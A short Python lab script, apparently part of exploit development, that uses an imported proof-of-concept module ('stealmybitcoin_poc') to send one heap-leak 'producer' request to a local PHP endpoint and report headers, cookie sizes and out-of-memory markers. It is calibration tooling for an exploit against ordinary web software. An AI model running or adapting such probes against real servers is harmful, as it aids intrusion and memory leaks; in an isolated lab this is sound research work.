#!/usr/bin/env python3
"""Calibration probe: send exactly one heap-stage producer and report the wire facts.

Run inside the attacker container, which shares the victim's network namespace.
This is a lab instrument, not part of the exploit.
"""
from __future__ import annotations

import hashlib
import socket
import sys

sys.path.insert(0, "/specimen")
import stealmybitcoin_poc as p  # noqa: E402


def main() -> int:
    target = p.Target("http", "127.0.0.1", 8080, "/php-version.php")
    shape = p.STAGES["heap"].producer
    body = p.leak_producer(shape)
    request = p.http_frame(target, body, p.COOKIE_BOUNDARY,
                           cookie_pairs=p.COOKIE_PAIRS, close=True)
    print(f"request_bytes={len(request)} body_bytes={len(body)} "
          f"sha256={hashlib.sha256(request).hexdigest()}")

    with socket.create_connection(("127.0.0.1", 8080), timeout=20) as sock:
        sock.sendall(request)
        chunks = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    raw = b"".join(chunks)
    head, _, payload = raw.partition(b"\r\n\r\n")
    print(f"response_bytes={len(raw)}")
    for line in head.split(b"\r\n"):
        text = line.decode("latin-1")
        if text.lower().startswith("set-cookie"):
            value = text.split("=", 1)[1].split(";", 1)[0] if "=" in text else ""
            print(f"header={text[:160]!r} cookie_value_bytes={len(value)}")
        else:
            print(f"header={text[:160]!r}")
    print(f"oom_marker={b'Allowed memory size' in payload and b'exhausted' in payload}")
    print(f"payload_bytes={len(payload)}")
    print("payload_head=" + repr(payload[:300]))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
